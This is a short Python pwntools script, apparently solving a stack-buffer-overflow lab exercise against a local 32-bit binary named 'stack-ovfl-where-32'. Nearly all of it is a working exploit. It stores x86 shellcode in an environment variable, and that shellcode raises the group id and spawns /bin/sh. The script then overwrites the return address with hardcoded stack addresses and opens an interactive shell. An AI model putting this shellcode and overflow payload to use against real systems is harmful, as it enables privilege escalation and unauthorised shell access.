#!/usr/bin/env python

from pwn import *
import os

env={
        'shellcode':'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80',
}

context.terminal = ["tmux", "splitw", "-h"]
p = process('./stack-ovfl-where-32', env=env)
#gdb.attach(p, 'b*input_func+59')

buf = "BBBB" +  p32(0xffffdfb8)
buf = buf + "A" * (0x26 - len(buf)) + p32(0xffffddc2) + p32(0x0804854c)


"""
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')
"""

p.sendline(buf)
p.interactive()
